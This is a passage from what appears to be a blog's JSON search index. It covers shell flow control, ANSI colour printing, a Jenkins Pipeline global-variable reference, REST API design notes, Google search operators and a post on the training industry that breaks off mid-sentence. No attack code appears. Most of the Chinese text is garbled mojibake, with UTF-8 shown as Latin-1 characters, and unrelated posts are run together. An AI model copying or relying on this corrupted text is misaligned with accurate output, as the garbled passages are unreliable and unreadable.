if elif then if [ -d public ] then echo \u0026#34;public exist\u0026#34; elif then å¾ªç¯ switch å¸¸ç”¨ä¾‹å­ åˆ¤æ–­ç›®å½•æ˜¯å¦å­˜åœ¨ if [ -d public ] then echo \u0026#34;public exist\u0026#34; if åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨ ","title":"æµç¨‹æ§åˆ¶"},{"content":"æ‰“å°å½©è‰²å­—ä½“ 0 é‡ç½® 30 é»‘è‰² 31 çº¢è‰² 32 ç»¿è‰² 33 é»„è‰² 34 è“è‰² 35 æ´‹çº¢ 36 é’è‰² 37 ç™½è‰² æŠŠ 31 æ”¹æˆå…¶ä»–æ•°å­—ï¼Œå°±å¯æ‰“å°å…¶ä»–é¢œè‰²çš„ this äº†ã€‚å¤§éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬åªéœ€è¦è®°ä½çº¢è‰²å’Œç»¿è‰²å°±å¯ä»¥äº†\necho -e \u0026#34;\\e[1;31m this \\e[0m whang\u0026#34; æ‰“å°å½©è‰²èƒŒæ™¯ 0 é‡ç½® 40 é»‘è‰² 41 çº¢è‰² 42 ç»¿è‰² 43 é»„è‰² 44 è“è‰² 45 æ´‹çº¢ 46 é’è‰² 47 ç™½è‰² echo -e \u0026#34;\\e[1;45m this \\e[0m whang\u0026#34; ","permalink":"https://wdd.js.org/shell/colorful-print/","summary":"æ‰“å°å½©è‰²å­—ä½“ 0 é‡ç½® 30 é»‘è‰² 31 çº¢è‰² 32 ç»¿è‰² 33 é»„è‰² 34 è“è‰² 35 æ´‹çº¢ 36 é’è‰² 37 ç™½è‰² æŠŠ 31 æ”¹æˆå…¶ä»–æ•°å­—ï¼Œå°±å¯æ‰“å°å…¶ä»–é¢œè‰²çš„ this äº†ã€‚å¤§éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬åªéœ€è¦è®°ä½çº¢è‰²å’Œç»¿è‰²å°±å¯ä»¥äº†\necho -e \u0026#34;\\e[1;31m this \\e[0m whang\u0026#34; æ‰“å°å½©è‰²èƒŒæ™¯ 0 é‡ç½® 40 é»‘è‰² 41 çº¢è‰² 42 ç»¿è‰² 43 é»„è‰² 44 è“è‰² 45 æ´‹çº¢ 46 é’è‰² 47 ç™½è‰² echo -e \u0026#34;\\e[1;45m this \\e[0m whang\u0026#34; ","title":"å½©è‰²æ–‡æœ¬ä¸å½©è‰²èƒŒæ™¯æ‰“å°"},{"content":"docker The docker variable offers convenient access to Docker-related functions from a Pipeline script.\nMethods needing a slave will implicitly run a node {â€¦} block if you have not wrapped them in one. It is a good idea to enclose a block of steps which should all run on the same node in such a block yourself. (If using a Swarm server, or any other specific Docker server, this probably does not matter, but if you are using the default server on localhost it likely will.)\nSome methods return instances of auxiliary classes which serve as holders for an ID and which have their own methods and properties. Methods taking a body return any value returned by the body itself. Some method parameters are optional and are enclosed with []. Reference:\nwithRegistry(url[, credentialsId]) {â€¦} Specifies a registry URL such as https://docker.mycorp.com/, plus an optional credentials ID to connect to it. withServer(uri[, credentialsId]) {â€¦} Specifies a server URI such as tcp://swarm.mycorp.com:2376, plus an optional credentials ID to connect to it. withTool(toolName) {â€¦} Specifies the name of a Docker installation to use, if any are defined in Jenkins global configuration. If unspecified, docker is assumed to be in the $PATH of the slave agent. image(id) Creates an Image object with a specified name or ID. See below. build(image[, args]) Runs docker build to create and tag the specified image from a Dockerfile in the current directory. Additional args may be added, such as \u0026lsquo;-f Dockerfile.other \u0026ndash;pull \u0026ndash;build-arg http_proxy=http://192.168.1.1:3128 .\u0026rsquo;. Like docker build, args must end with the build context. Returns the resulting Image object. Records a FROM fingerprint in the build. Image.id The image name with optional tag (mycorp/myapp, mycorp/myapp:latest) or ID (hexadecimal hash). Image.run([args, command]) Uses docker run to run the image, and returns a Container which you could stop later. Additional args may be added, such as \u0026lsquo;-p 8080:8080 \u0026ndash;memory-swap=-1\u0026rsquo;. Optional command is equivalent to Docker command specified after the image. Records a run fingerprint in the build. Image.withRun[(args[, command])] {â€¦} Like run but stops the container as soon as its body exits, so you do not need a try-finally block. Image.inside[(args)] {â€¦} Like withRun this starts a container for the duration of the body, but all external commands (sh) launched by the body run inside the container rather than on the host. These commands run in the same working directory (normally a slave workspace), which means that the Docker server must be on localhost. Image.tag([tagname]) Runs docker tag to record a tag of this image (defaulting to the tag it already has). Will rewrite an existing tag if one exists. Image.push([tagname]) Pushes an image to the registry after tagging it as with the tag method. For example, you can use image.push \u0026rsquo;latest\u0026rsquo; to publish it as the latest version in its repository. Image.pull() Runs docker pull. Not necessary before run, withRun, or inside. Image.imageName() The id prefixed as needed with registry information, such as docker.mycorp.com/mycorp/myapp. May be used if running your own Docker commands using sh. Container.id Hexadecimal ID of a running container. Container.stop Runs docker stop and docker rm to shut down a container and remove its storage. Container.port(port) Runs docker port on the container to reveal how the port port is mapped on the host. env Environment variables are accessible from Groovy code as env.VARNAME or simply as VARNAME. You can write to such properties as well (only using the env. prefix):\nenv.MYTOOL_VERSION = \u0026#39;1.33\u0026#39; node { sh \u0026#39;/usr/local/mytool-$MYTOOL_VERSION/bin/start\u0026#39; } These definitions will also be available via the REST API during the build or after its completion, and from upstream Pipeline builds using the build step.\nHowever any variables set this way are global to the Pipeline build. For variables with node-specific content (such as file paths), you should instead use the withEnv step, to bind the variable only within a node block.\nA set of environment variables are made available to all Jenkins projects, including Pipelines. The following is a general list of variables (by name) that are available; see the notes below the list for Pipeline-specific details.\nBRANCH_NAME For a multibranch project, this will be set to the name of the branch being built, for example in case you wish to deploy to production from master but not from feature branches. CHANGE_ID For a multibranch project corresponding to some kind of change request, this will be set to the change ID, such as a pull request number. CHANGE_URL For a multibranch project corresponding to some kind of change request, this will be set to the change URL. CHANGE_TITLE For a multibranch project corresponding to some kind of change request, this will be set to the title of the change. CHANGE_AUTHOR For a multibranch project corresponding to some kind of change request, this will be set to the username of the author of the proposed change. CHANGE_AUTHOR_DISPLAY_NAME For a multibranch project corresponding to some kind of change request, this will be set to the human name of the author. CHANGE_AUTHOR_EMAIL For a multibranch project corresponding to some kind of change request, this will be set to the email address of the author. CHANGE_TARGET For a multibranch project corresponding to some kind of change request, this will be set to the target or base branch to which the change could be merged. BUILD_NUMBER The current build number, such as \u0026ldquo;153\u0026rdquo; BUILD_ID The current build ID, identical to BUILD_NUMBER for builds created in 1.597+, but a YYYY-MM-DD_hh-mm-ss timestamp for older builds **BUILD_DISPLAY_NAME The display name of the current build, which is something like \u0026ldquo;#153\u0026rdquo; by default. JOB_NAME Name of the project of this build, such as \u0026ldquo;foo\u0026rdquo; or \u0026ldquo;foo/bar\u0026rdquo;. (To strip off folder paths from a Bourne shell script, try: ${JOB_NAME##*/}) BUILD_TAG String of \u0026ldquo;jenkins-${JOB_NAME}-${BUILD_NUMBER}\u0026rdquo;. Convenient to put into a resource file, a jar file, etc for easier identification. EXECUTOR_NUMBER The unique number that identifies the current executor (among executors of the same machine) thatâ€™s carrying out this build. This is the number you see in the \u0026ldquo;build executor status\u0026rdquo;, except that the number starts from 0, not 1. NODE_NAME Name of the slave if the build is on a slave, or \u0026ldquo;master\u0026rdquo; if run on master NODE_LABELS Whitespace-separated list of labels that the node is assigned. WORKSPACE The absolute path of the directory assigned to the build as a workspace. JENKINS_HOME The absolute path of the directory assigned on the master node for Jenkins to store data. JENKINS_URL Full URL of Jenkins, like http://server:port/jenkins/ (note: only available if Jenkins URL set in system configuration) BUILD_URL Full URL of this build, like http://server:port/jenkins/job/foo/15/ (Jenkins URL must be set) JOB_URL Full URL of this job, like http://server:port/jenkins/job/foo/ (Jenkins URL must be set) The following variables are currently unavailable inside a Pipeline script: SCM-specific variables such as SVN_REVISIONAs an example of loading variable values from Groovy:\nmail to: \u0026#39;devops@acme.com\u0026#39;, subject: \u0026#34;Job \u0026#39;${JOB_NAME}\u0026#39; (${BUILD_NUMBER}) is waiting for input\u0026#34;, body: \u0026#34;Please go to ${BUILD_URL} and verify the build\u0026#34; params Exposes all parameters defined in the build as a read-only map with variously typed values. Example:\nif (params.BOOLEAN_PARAM_NAME) {doSomething()} Note for multibranch (Jenkinsfile) usage: the properties step allows you to define job properties, but these take effect when the step is run, whereas build parameter definitions are generally consulted before the build begins. As a convenience, any parameters currently defined in the job which have default values will also be listed in this map. That allows you to write, for example:\nproperties([parameters([string(name: \u0026lsquo;BRANCH\u0026rsquo;, defaultValue: \u0026lsquo;master\u0026rsquo;)])])\ngit url: \u0026#39;â€¦\u0026#39;, branch: params.BRANCH and be assured that the master branch will be checked out even in the initial build of a branch project, or if the previous build did not specify parameters or used a different parameter name.\ncurrentBuild The currentBuild variable may be used to refer to the currently running build. It has the following readable properties:\nnumber build number (integer) result typically SUCCESS, UNSTABLE, or FAILURE (may be null for an ongoing build) currentResult typically SUCCESS, UNSTABLE, or FAILURE. Will never be null. resultIsBetterOrEqualTo(String) Compares the current build result to the provided result string (SUCCESS, UNSTABLE, or FAILURE) and returns true if the current build result is better than or equal to the provided result. resultIsWorseOrEqualTo(String) Compares the current build result to the provided result string (SUCCESS, UNSTABLE, or FAILURE) and returns true if the current build result is worse than or equal to the provided result. displayName normally #123 but sometimes set to, e.g., an SCM commit identifier description additional information about the build id normally number as a string timeInMillis time since the epoch when the build was scheduled startTimeInMillis time since the epoch when the build started running duration duration of the build in milliseconds durationString a human-readable representation of the build duration previousBuild another similar object, or null nextBuild similarly absoluteUrl URL of build index page buildVariables for a non-Pipeline downstream build, offers access to a map of defined build variables; for a Pipeline downstream build, any variables set globally on env changeSets a list of changesets coming from distinct SCM checkouts; each has a kind and is a list of commits; each commit has a commitId, timestamp, msg, author, and affectedFiles each of which has an editType and path; the value will not generally be Serializable so you may only access it inside a method marked @NonCPS rawBuild a hudson.model.Run with further APIs, only for trusted libraries or administrator-approved scripts outside the sandbox; the value will not be Serializable so you may only access it inside a method marked @NonCPS Additionally, for this build only (but not for other builds), the following properties are writable: result displayName description scm Represents the SCM configuration in a multibranch project build. Use checkout scm to check out sources matching Jenkinsfile.You may also use this in a standalone project configured with Pipeline script from SCM, though in that case the checkout will just be of the latest revision in the branch, possibly newer than the revision from which the Pipeline script was loaded.\nå‚è€ƒ Global Variable Reference ","permalink":"https://wdd.js.org/posts/2019/10/ikg19e/","summary":"docker The docker variable offers convenient access to Docker-related functions from a Pipeline script.\nMethods needing a slave will implicitly run a node {â€¦} block if you have not wrapped them in one. It is a good idea to enclose a block of steps which should all run on the same node in such a block yourself. (If using a Swarm server, or any other specific Docker server, this probably does not matter, but if you are using the default server on localhost it likely will.","title":"Jenkins å…¨å±€å˜é‡å‚è€ƒ"},{"content":"1. ä»€ä¹ˆæ˜¯REST? è¡¨ç°å±‚çŠ¶æ€è½¬æ¢ï¼ˆRESTï¼Œè‹±æ–‡ï¼šRepresentational State Transferï¼‰æ˜¯Roy Thomas Fieldingåšå£«äº2000å¹´åœ¨ä»–çš„åšå£«è®ºæ–‡[1] ä¸­æå‡ºæ¥çš„ä¸€ç§ä¸‡ç»´ç½‘è½¯ä»¶æ¶æ„é£æ ¼ï¼Œç›®çš„æ˜¯ä¾¿äºä¸åŒè½¯ä»¶/ç¨‹åºåœ¨ç½‘ç»œï¼ˆä¾‹å¦‚äº’è”ç½‘ï¼‰ä¸­äº’ç›¸ä¼ é€’ä¿¡æ¯ã€‚è¡¨ç°å±‚çŠ¶æ€è½¬æ¢ï¼ˆRESTï¼Œè‹±æ–‡ï¼šRepresentational State Transferï¼‰æ˜¯æ ¹åŸºäºè¶…æ–‡æœ¬ä¼ è¾“åè®®(HTTP)ä¹‹ä¸Šè€Œç¡®å®šçš„ä¸€ç»„çº¦æŸå’Œå±æ€§ï¼Œæ˜¯ä¸€ç§è®¾è®¡æä¾›ä¸‡ç»´ç½‘ç»œæœåŠ¡çš„è½¯ä»¶æ„å»ºé£æ ¼ã€‚åŒ¹é…æˆ–å…¼å®¹äºè¿™ç§æ¶æ„é£æ ¼(ç®€ç§°ä¸º REST æˆ– RESTful)çš„ç½‘ç»œæœåŠ¡ï¼Œå…è®¸å®¢æˆ·ç«¯å‘å‡ºä»¥ç»Ÿä¸€èµ„æºæ ‡è¯†ç¬¦è®¿é—®å’Œæ“ä½œç½‘ç»œèµ„æºçš„è¯·æ±‚ï¼Œè€Œä¸é¢„å…ˆå®šä¹‰å¥½çš„æ— çŠ¶æ€æ“ä½œé›†ä¸€è‡´åŒ–ã€‚wikipdeia\nREST API ä¸æ˜¯ä¸€ä¸ªæ ‡å‡†æˆ–è€…ä¸€ä¸ªæ˜¯åè®®ï¼Œä»…ä»…æ˜¯ä¸€ç§é£æ ¼ï¼Œä¸€ç§styleã€‚\nRESTful APIçš„ç®€å•å®šä¹‰å¯ä»¥è½»æ¾è§£é‡Šè¿™ä¸ªæ¦‚å¿µã€‚ RESTæ˜¯ä¸€ç§æ¶æ„é£æ ¼ï¼ŒRESTfulæ˜¯å®ƒçš„è§£é‡Šã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæ‚¨çš„åç«¯æœåŠ¡å™¨å…·æœ‰REST APIï¼Œå¹¶ä¸”æ‚¨ï¼ˆä»ç½‘ç«™/åº”ç”¨ç¨‹åºï¼‰å‘å®¢æˆ·ç«¯è¯·æ±‚æ­¤APIï¼Œåˆ™æ‚¨çš„å®¢æˆ·ç«¯ä¸ºRESTfulã€‚\n2. REST APIæœ€ä¸ºé‡è¦çš„çº¦æŸ Client-Server é€šä¿¡åªèƒ½ç”±å®¢æˆ·ç«¯å•æ–¹é¢å‘èµ·ï¼Œè¡¨ç°ä¸ºè¯·æ±‚-å“åº”çš„å½¢å¼ Stateless é€šä¿¡çš„ä¼šè¯çŠ¶æ€ï¼ˆSession Stateï¼‰åº”è¯¥å…¨éƒ¨ç”±å®¢æˆ·ç«¯è´Ÿè´£ç»´æŠ¤ Cache å“åº”å†…å®¹å¯ä»¥åœ¨é€šä¿¡é“¾çš„æŸå¤„è¢«ç¼“å­˜ï¼Œä»¥æ”¹å–„ç½‘ç»œæ•ˆç‡ Uniform Interface é€šä¿¡é“¾çš„ç»„ä»¶ä¹‹é—´é€šè¿‡ç»Ÿä¸€çš„æ¥å£ç›¸äº’é€šä¿¡ï¼Œä»¥æé«˜äº¤äº’çš„å¯è§æ€§ Layered System é€šè¿‡é™åˆ¶ç»„ä»¶çš„è¡Œä¸ºï¼ˆå³æ¯ä¸ªç»„ä»¶åªèƒ½â€œçœ‹åˆ°â€ä¸å…¶äº¤äº’çš„ç´§é‚»å±‚ï¼‰ï¼Œå°†æ¶æ„åˆ†è§£ä¸ºè‹¥å¹²ç­‰çº§çš„å±‚ã€‚ Code-On-Demand æ”¯æŒé€šè¿‡ä¸‹è½½å¹¶æ‰§è¡Œä¸€äº›ä»£ç ï¼ˆä¾‹å¦‚Java Appletã€Flashæˆ–JavaScriptï¼‰ï¼Œå¯¹å®¢æˆ·ç«¯çš„åŠŸèƒ½è¿›è¡Œæ‰©å±•ã€‚ 3. REST API HTTPæ–¹æ³• ä¸ CURD REST API ä½¿ç”¨POSTï¼ŒGET, PUT, DELETEçš„HTTPæ–¹æ³•æ¥æè¿°å¯¹èµ„æºçš„å¢ã€æŸ¥ã€æ”¹ã€åˆ ã€‚è¿™å››ä¸ªHTTPæ–¹æ³•åœ¨æ•°æ®å±‚å¯¹åº”ç€SQLçš„æ’å…¥ã€æŸ¥è¯¢ã€æ›´æ–°ã€åˆ é™¤æ“ä½œã€‚\n4. çŠ¶æ€ç  1xx - informational; 2xx - success; 3xx - redirection; 4xx - client error; 5xx - server error. 5. RESTfulæ¶æ„è®¾è®¡ GET /users - get all users; GET /users/123 - get a particular user with id = 123; GET /posts - get all posts. POST /users. PUT /users/123 - upgrade a user entity with id = 123. DELETE /users/123 - delete a user with id = 123. 6. æ–‡æ¡£ 7. ç‰ˆæœ¬ ç‰ˆæœ¬ç®¡ç†ä¸€èˆ¬æœ‰ä¸¤ç§\nä½äºurlä¸­çš„ç‰ˆæœ¬æ ‡è¯†ï¼š http://example.com/api/v1 ä½äºè¯·æ±‚å¤´ä¸­çš„ç‰ˆæœ¬æ ‡è¯†ï¼šAccept: application/vnd.redkavasyl+json; version=2.0 8. æ·±å…¥ç†è§£çŠ¶æ€ä¸æ— çŠ¶æ€ æˆ‘è®¤ä¸ºRESTæ¶æ„æœ€éš¾ç†è§£çš„å°±æ˜¯çŠ¶æ€ä¸æ— çŠ¶æ€ã€‚ä¸‹é¢æˆ‘ç”»å‡ºä¸¤ä¸ªç¤ºæ„å›¾ã€‚\nå›¾1æ˜¯æœ‰çŠ¶æ€çš„æœåŠ¡ï¼ŒçŠ¶æ€å­˜å‚¨äºå•ä¸ªæœåŠ¡ä¹‹ä¸­ï¼Œä¸€æ—¦ä¸€ä¸ªæœåŠ¡æŒ‚äº†ï¼ŒçŠ¶æ€å°±æ²¡äº†ï¼Œæœ‰çŠ¶æ€æœåŠ¡å¾ˆéš¾æ‰©å±•ã€‚æ— çŠ¶æ€çš„æœåŠ¡ï¼ŒçŠ¶æ€å­˜å‚¨äºå®¢æˆ·ç«¯ï¼Œä¸€ä¸ªè¯·æ±‚å¯ä»¥è¢«æŠ•é€’åˆ°ä»»ä½•æœåŠ¡ç«¯ï¼Œå³ä½¿ä¸€ä¸ªæœåŠ¡æŒ‚äº†ï¼Œä¹Ÿä¸å›å½±å“åˆ°åŒä¸€ä¸ªå®¢æˆ·ç«¯å‘æ¥çš„ä¸‹ä¸€ä¸ªè¯·æ±‚ã€‚\nã€å›¾1 æœ‰çŠ¶æ€çš„æ¶æ„ã€‘\nã€å›¾2 æ— çŠ¶æ€çš„æ¶æ„ã€‘\neach request from client to server must contain all of the information necessary to understand the request, and cannot take advantage of any stored context on the server. Session state is therefore kept entirely on the client. rest_arch_style stateless\næ¯ä¸€ä¸ªè¯·æ±‚è‡ªèº«å¿…é¡»æºå¸¦æ‰€æœ‰çš„ä¿¡æ¯ï¼Œè®©å®¢æˆ·ç«¯ç†è§£è¿™ä¸ªè¯·æ±‚ã€‚ä¸¾ä¸ªæ —å­ï¼Œå¸¸è§çš„ç¿»é¡µæ“ä½œï¼Œåº”è¯¥å®¢æˆ·ç«¯å‘Šè¯‰æœåŠ¡ç«¯æƒ³è¦çœ‹ç¬¬å‡ é¡µçš„æ•°æ®ï¼Œè€Œä¸åº”è¯¥è®©æœåŠ¡ç«¯è®°ä½å®¢æˆ·ç«¯çœ‹åˆ°äº†ç¬¬å‡ é¡µã€‚\n9. å‚è€ƒ A Beginnerâ€™s Tutorial for Understanding RESTful API Versioning REST Services http://ruanyifeng.com/blog/2018/10/restful-api-best-practices.html https://florimond.dev/en/posts/2018/08/restful-api-design-13-best-practices-to-make-your-users-happy/ https://docs.microsoft.com/en-us/azure/architecture/best-practices/api-design https://github.com/Microsoft/api-guidelines/blob/master/Guidelines.md https://github.com/cocoajin/http-api-design-ZH_CN https://www.cnblogs.com/welan/p/9875103.html ","permalink":"https://wdd.js.org/posts/2019/10/irl0p4/","summary":"1. ä»€ä¹ˆæ˜¯REST? è¡¨ç°å±‚çŠ¶æ€è½¬æ¢ï¼ˆRESTï¼Œè‹±æ–‡ï¼šRepresentational State Transferï¼‰æ˜¯Roy Thomas Fieldingåšå£«äº2000å¹´åœ¨ä»–çš„åšå£«è®ºæ–‡[1] ä¸­æå‡ºæ¥çš„ä¸€ç§ä¸‡ç»´ç½‘è½¯ä»¶æ¶æ„é£æ ¼ï¼Œç›®çš„æ˜¯ä¾¿äºä¸åŒè½¯ä»¶/ç¨‹åºåœ¨ç½‘ç»œï¼ˆä¾‹å¦‚äº’è”ç½‘ï¼‰ä¸­äº’ç›¸ä¼ é€’ä¿¡æ¯ã€‚è¡¨ç°å±‚çŠ¶æ€è½¬æ¢ï¼ˆRESTï¼Œè‹±æ–‡ï¼šRepresentational State Transferï¼‰æ˜¯æ ¹åŸºäºè¶…æ–‡æœ¬ä¼ è¾“åè®®(HTTP)ä¹‹ä¸Šè€Œç¡®å®šçš„ä¸€ç»„çº¦æŸå’Œå±æ€§ï¼Œæ˜¯ä¸€ç§è®¾è®¡æä¾›ä¸‡ç»´ç½‘ç»œæœåŠ¡çš„è½¯ä»¶æ„å»ºé£æ ¼ã€‚åŒ¹é…æˆ–å…¼å®¹äºè¿™ç§æ¶æ„é£æ ¼(ç®€ç§°ä¸º REST æˆ– RESTful)çš„ç½‘ç»œæœåŠ¡ï¼Œå…è®¸å®¢æˆ·ç«¯å‘å‡ºä»¥ç»Ÿä¸€èµ„æºæ ‡è¯†ç¬¦è®¿é—®å’Œæ“ä½œç½‘ç»œèµ„æºçš„è¯·æ±‚ï¼Œè€Œä¸é¢„å…ˆå®šä¹‰å¥½çš„æ— çŠ¶æ€æ“ä½œé›†ä¸€è‡´åŒ–ã€‚wikipdeia\nREST API ä¸æ˜¯ä¸€ä¸ªæ ‡å‡†æˆ–è€…ä¸€ä¸ªæ˜¯åè®®ï¼Œä»…ä»…æ˜¯ä¸€ç§é£æ ¼ï¼Œä¸€ç§styleã€‚\nRESTful APIçš„ç®€å•å®šä¹‰å¯ä»¥è½»æ¾è§£é‡Šè¿™ä¸ªæ¦‚å¿µã€‚ RESTæ˜¯ä¸€ç§æ¶æ„é£æ ¼ï¼ŒRESTfulæ˜¯å®ƒçš„è§£é‡Šã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæ‚¨çš„åç«¯æœåŠ¡å™¨å…·æœ‰REST APIï¼Œå¹¶ä¸”æ‚¨ï¼ˆä»ç½‘ç«™/åº”ç”¨ç¨‹åºï¼‰å‘å®¢æˆ·ç«¯è¯·æ±‚æ­¤APIï¼Œåˆ™æ‚¨çš„å®¢æˆ·ç«¯ä¸ºRESTfulã€‚\n2. REST APIæœ€ä¸ºé‡è¦çš„çº¦æŸ Client-Server é€šä¿¡åªèƒ½ç”±å®¢æˆ·ç«¯å•æ–¹é¢å‘èµ·ï¼Œè¡¨ç°ä¸ºè¯·æ±‚-å“åº”çš„å½¢å¼ Stateless é€šä¿¡çš„ä¼šè¯çŠ¶æ€ï¼ˆSession Stateï¼‰åº”è¯¥å…¨éƒ¨ç”±å®¢æˆ·ç«¯è´Ÿè´£ç»´æŠ¤ Cache å“åº”å†…å®¹å¯ä»¥åœ¨é€šä¿¡é“¾çš„æŸå¤„è¢«ç¼“å­˜ï¼Œä»¥æ”¹å–„ç½‘ç»œæ•ˆç‡ Uniform Interface é€šä¿¡é“¾çš„ç»„ä»¶ä¹‹é—´é€šè¿‡ç»Ÿä¸€çš„æ¥å£ç›¸äº’é€šä¿¡ï¼Œä»¥æé«˜äº¤äº’çš„å¯è§æ€§ Layered System é€šè¿‡é™åˆ¶ç»„ä»¶çš„è¡Œä¸ºï¼ˆå³æ¯ä¸ªç»„ä»¶åªèƒ½â€œçœ‹åˆ°â€ä¸å…¶äº¤äº’çš„ç´§é‚»å±‚ï¼‰ï¼Œå°†æ¶æ„åˆ†è§£ä¸ºè‹¥å¹²ç­‰çº§çš„å±‚ã€‚ Code-On-Demand æ”¯æŒé€šè¿‡ä¸‹è½½å¹¶æ‰§è¡Œä¸€äº›ä»£ç ï¼ˆä¾‹å¦‚Java Appletã€Flashæˆ–JavaScriptï¼‰ï¼Œå¯¹å®¢æˆ·ç«¯çš„åŠŸèƒ½è¿›è¡Œæ‰©å±•ã€‚ 3. REST API HTTPæ–¹æ³• ä¸ CURD REST API ä½¿ç”¨POSTï¼ŒGET, PUT, DELETEçš„HTTPæ–¹æ³•æ¥æè¿°å¯¹èµ„æºçš„å¢ã€æŸ¥ã€æ”¹ã€åˆ ã€‚è¿™å››ä¸ªHTTPæ–¹æ³•åœ¨æ•°æ®å±‚å¯¹åº”ç€SQLçš„æ’å…¥ã€æŸ¥è¯¢ã€æ›´æ–°ã€åˆ é™¤æ“ä½œã€‚\n4. çŠ¶æ€ç  1xx - informational; 2xx - success; 3xx - redirection; 4xx - client error; 5xx - server error. 5. RESTfulæ¶æ„è®¾è®¡ GET /users - get all users; GET /users/123 - get a particular user with id = 123; GET /posts - get all posts.","title":"Restful API æ¶æ„æ€è€ƒ"},{"content":"1. è°·æ­Œæœç´¢æŒ‡ä»¤ 2. åŸºæœ¬å‘½ä»¤ ç¬¦å· ç®€ä»‹ è¯­æ³• æ³¨æ„ç‚¹ ç¤ºä¾‹ + åŒ…å«Aä¸”å¿…é¡»åŒ…å«B A +B Aå’Œ+ä¹‹é—´æœ‰ç©ºæ ¼ Maxwell +wills - åŒ…å«Aä¸”ä¸åŒ…å«B A -B Aå’Œ+ä¹‹é—´æœ‰ç©ºæ ¼ Maxwell -Absolom \u0026quot; \u0026quot; å®Œæ•´åŒ¹é…AB \u0026ldquo;AB\u0026rdquo; \u0026ldquo;Thomas Jefferson\u0026rdquo; OR åŒ…å«Aæˆ–è€…B A OR B æˆ–è€… `A B` +-\u0026ldquo;OR æŒ‡ä»¤å¯ä»¥ç»„åˆï¼Œå®Œæˆæ›´å¤æ‚çš„æŸ¥è¯¢ beach -sandy +albert +nathaniel ~ åŒ…å«A, å¹¶ä¸”åŒ…å«Bçš„è¿‘ä¹‰è¯ A ~B github ~js .. åŒºé—´æŸ¥è¯¢ ABä¹‹é—´ A..B china 1888..2000 * åŒ¹é…ä»»æ„å­—ç¬¦ node* java site: ç«™å†…æœç´¢ A site:B filetype: æŒ‰ç…§æ–‡ä»¶ç±»å‹æœç´¢ A filetype:B csta filetype:pdf 3. å…³é”®è¯ä½¿ç”¨ æ–¹æ³• è¯´æ˜ ç¤ºä¾‹ åˆ—ä¸¾å…³é”®è¯ åˆ—ä¸¾æ‰€æœ‰å’Œæœç´¢ç›¸å…³çš„å…³é”®è¯ï¼Œå¹¶ä¸”å°½é‡æŠŠé‡è¦çš„å…³é”®è¯æ’åœ¨å‰é¢ã€‚ä¸åŒçš„å…³é”®è¯é¡ºåºä¼šå¯¼è‡´ä¸åŒçš„è¿”å›ä¸åŒçš„ç»“æœ ä¹¦æ³• æ¯›ç¬” ç»˜ç”» ä¸è¦ä½¿ç”¨æŸäº›è¯ å¦‚ä»£è¯ä»‹è¯è¯­æ°”è¯ï¼Œå¦‚i, the, of, it, æˆ‘ï¼Œå— æœç´¢å¼•æ“ä¸€èˆ¬ä¼šç›´æ¥å¿½ç•¥è¿™äº›ä¿¡æ¯å«é‡å°‘çš„è¯ å¤§å°å†™ä¸æ•æ„Ÿ å¤§å†™å­—ç¬¦å’Œå°å†™å­—ç¬¦åœ¨æœç´¢å¼•æ“çœ‹æ²¡æœ‰åŒºåˆ«ï¼Œå°½é‡ä½¿ç”¨å°å†™çš„å°±å¯ä»¥ 4. ç‰¹æ®Šå·¥å…· 4.1. define å¿«é€Ÿè¿”å›å…³é”®è¯å®šä¹‰ 4.2. è®¡ç®—å™¨ 4.3. å•ä½è½¬æ¢ 4.4. æ—¶åŒºæŸ¥è¯¢ 4.5. åœ°åŒºæŸ¥è¯¢ 4.6. å¤©æ°”æŸ¥è¯¢ 5. å‚è€ƒ Advanced Google Search Commands Google_rules_for_searching.pdf An introduction to search commands ","permalink":"https://wdd.js.org/posts/2019/10/giflpm/","summary":"1. è°·æ­Œæœç´¢æŒ‡ä»¤ 2. åŸºæœ¬å‘½ä»¤ ç¬¦å· ç®€ä»‹ è¯­æ³• æ³¨æ„ç‚¹ ç¤ºä¾‹ + åŒ…å«Aä¸”å¿…é¡»åŒ…å«B A +B Aå’Œ+ä¹‹é—´æœ‰ç©ºæ ¼ Maxwell +wills - åŒ…å«Aä¸”ä¸åŒ…å«B A -B Aå’Œ+ä¹‹é—´æœ‰ç©ºæ ¼ Maxwell -Absolom \u0026quot; \u0026quot; å®Œæ•´åŒ¹é…AB \u0026ldquo;AB\u0026rdquo; \u0026ldquo;Thomas Jefferson\u0026rdquo; OR åŒ…å«Aæˆ–è€…B A OR B æˆ–è€… `A B` +-\u0026ldquo;OR æŒ‡ä»¤å¯ä»¥ç»„åˆï¼Œå®Œæˆæ›´å¤æ‚çš„æŸ¥è¯¢ beach -sandy +albert +nathaniel ~ åŒ…å«A, å¹¶ä¸”åŒ…å«Bçš„è¿‘ä¹‰è¯ A ~B github ~js .. åŒºé—´æŸ¥è¯¢ ABä¹‹é—´ A..B china 1888..2000 * åŒ¹é…ä»»æ„å­—ç¬¦ node* java site: ç«™å†…æœç´¢ A site:B filetype: æŒ‰ç…§æ–‡ä»¶ç±»å‹æœç´¢ A filetype:B csta filetype:pdf 3.","title":"æŒæ¡è°·æ­Œæœç´¢é«˜çº§æŒ‡ä»¤"},{"content":"1. åŸ¹è®­è¡Œä¸šçš„ç°çŠ¶å’Œé—®é¢˜ è¿›å…¥åŸ¹è®­ç­å­¦ä¹ å¯èƒ½æœ‰ä¸€ä¸‹ä¸¤ä¸ªåŸå› ï¼š\næƒ³è½¬è¡Œ å­¦æ ¡é‡Œå­¦çš„ä¸œè¥¿å¤ªè¿‡æ—¶äº†ï¼Œéœ€è¦æ·±å…¥å­¦ä¹ æœ¬è¡Œä¸šçš„çŸ¥è¯† åŸ¹è®­çš„è¡Œä¸šçš„æ ¸å¿ƒæ€æƒ³éƒ½æ˜¯ï¼šå¦‚ä½•å¿«é€Ÿçš„è®©ä½ èƒ½å¤Ÿé¢è¯•é€šè¿‡\nè€å¸ˆæ•™çš„ä¸œè¥¿å¤§å¤šæ˜¯ä¸€äº›é¢è¯•å¿…é¡»è¦é—®çš„ä¸€äº›çŸ¥è¯†ï¼Œåšçš„é¡¹ç›®ä¹Ÿåº”è¯¥éƒ½æ˜¯å¸‚é¢ä¸Šæ¯”è¾ƒç«çš„é¡¹ç›®ã€‚è¿™ä¹ˆåšçš„ä¸åˆ©ä¹‹å¤„æœ‰ä»¥ä¸‹å‡ 